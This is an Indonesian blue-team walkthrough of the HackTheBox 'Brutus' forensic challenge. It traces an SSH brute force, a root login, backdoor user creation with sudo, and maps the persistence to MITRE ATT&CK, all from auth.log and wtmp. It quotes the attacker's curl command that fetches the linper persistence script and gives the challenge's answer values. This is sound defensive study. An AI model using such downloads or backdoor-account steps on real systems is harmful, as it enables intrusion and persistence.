---
title: "Brutus HTB — Investigasi SSH Brute Force dari Auth.log"
description: "Walkthrough forensic Brutus dari HackTheBox. Analisis auth.log dan wtmp untuk melacak serangan SSH brute force, persistence, dan privilege escalation."
date: 2026-03-04 00:00:00 +0700
categories: [Blue Team, CTF, Logs, Forensic]
tags: [Hack The Box, IDN Networkers, SSH Brute Force, Auth Log, Linux Forensic, MITRE ATT&CK]
authors: [fachri]
toc: true
comments: false
media_subpath: /content/img/BrutusHTB
---

![Cover Brutus HTB — Forensic SSH Log Analysis](10.png)

Auth.log dan wtmp — dua file yang sering dianggap remeh, tapi ternyata bisa cerita banyak soal serangan SSH brute force. Di Sherlock Brutus ini, kita bakal lihat gimana attacker masuk, bikin akun backdoor, dan naikin privilege. Semua dari log doang.

Tools yang dipake: **auth.log analysis, wtmp, MITRE ATT&CK mapping**.

---

## Soal 1 — Cari IP Attacker

> Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?

### Penjelasan

Buka auth.log-nya, langsung keliatan IP yang ngirim banyak request login gagal. Pola brute force selalu gitu — banyak failed attempt dalam waktu singkat dari IP yang sama.

![auth.log menunjukkan IP 65.2.161.68 melakukan banyak percobaan SSH](1.png)

### Jawaban

```
65.2.161.68
```

---

## Soal 2 — Username Yang Berhasil Login

> The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?

### Penjelasan

Dari ribuan percobaan login, pasti ada satu yang berhasil. Cari aja log `Accepted password` di auth.log — dari IP attacker tadi.

![Log Accepted password untuk user root dari IP 65.2.161.68](2.png)

### Jawaban

```
root
```

---

## Soal 3 — Timestamp Login Manual (UTC)

> Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session.

### Penjelasan

Login via SSH beda sama autentikasi biasa. Auth.log nyatet kapan password diterima, tapi buat liat kapan session terminal beneran kebuka, kita perlu lihat file **wtmp**.

Di soal udah dikasih script Python buat parse wtmp ke format yang lebih enak dibaca.

![Hasil parsing wtmp menunjukkan login session](3.png)

Dari situ keliatan attacker login manual pada **2024-03-06 13:32:45** WIB lewat IP 65.2.161.68.

![Timestamp login di wtmp](4.png)

Karena Kali Linux saya pake timezone WIB, perlu dikonversi ke UTC:

> WIB = UTC+7. Kurangi 7 jam dari waktu WIB.

### Jawaban

```
2024-03-06 06:32:45
```

---

## Soal 4 — Session Number

> SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session?

### Penjelasan

Setiap session SSH punya nomor unik. Cek di auth.log — cari log yang berkaitan sama session yang terbuka pas attacker login.

![auth.log menunjukkan session 37 dibuka untuk user root](5.png)

### Jawaban

```
37
```

---

## Soal 5 — Akun Backdoor Buatan Attacker

> The attacker added a new user as part of their persistence strategy. What is the name of this account?

### Penjelasan

Ini bagian persistence klasik — attacker bikin user baru biar bisa balik lagi kapan aja. Di auth.log, keliatan perintah `useradd` dan `usermod -aG sudo` buat ngasih akses root.

![Log pembuatan user cyberjunkie dan pemberian sudo](6.png)

### Jawaban

```
cyberjunkie
```

---

## Soal 6 — MITRE ATT&CK Technique ID

> What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?

### Penjelasan

MITRE ATT&CK punya kategori khusus buat persistence via akun lokal. Cek di [attack.mitre.org](https://attack.mitre.org/) — teknik pembuatan akun di server sendiri masuk ke **T1136.001 (Local Account)**.

![MITRE ATT&CK halaman T1136.001](11.png)

### Jawaban

```
T1136.001
```

---

## Soal 7 — Waktu Session Berakhir

> What time did the attacker's first SSH session end according to auth.log?

### Penjelasan

Cari log `Received disconnect` atau `pam_unix` session close di auth.log buat session 37.

![auth.log menunjukkan session 37 ditutup pukul 06:37:24](8.png)

### Jawaban

```
2024-03-06 06:37:24
```

---

## Soal 8 — Eksekusi Command via Sudo

> What is the full command executed using sudo?

### Penjelasan

Setelah login pake akun **cyberjunkie**, attacker download script enumeration pake curl. Biasa dilakukan buat ngecek apa lagi yang bisa dieksploitasi di server.

![Log eksekusi curl download linper.sh](9.png)

Command yang dijalankan:

```bash
/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

### Jawaban

```
/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

---

## Apa yang Bisa Dipelajari

Kasus ini nunjukkin kalau log sistem yang keliatan sepele kayak **auth.log** dan **wtmp** sebenarnya harta karun buat incident response.

1. **auth.log bukan cuma buat brute-force** — bisa buat追踪 aktivitas post-exploitasi: pembuatan akun, sudo, sampe command execution.
2. **Korelasi multi-source** — auth.log + wtmp = gambaran utuh dari percobaan login sampe sesi berakhir.
3. **MITRE ATT&CK mapping** — menghubungkan taktik attacker ke framework industri yang diakui.
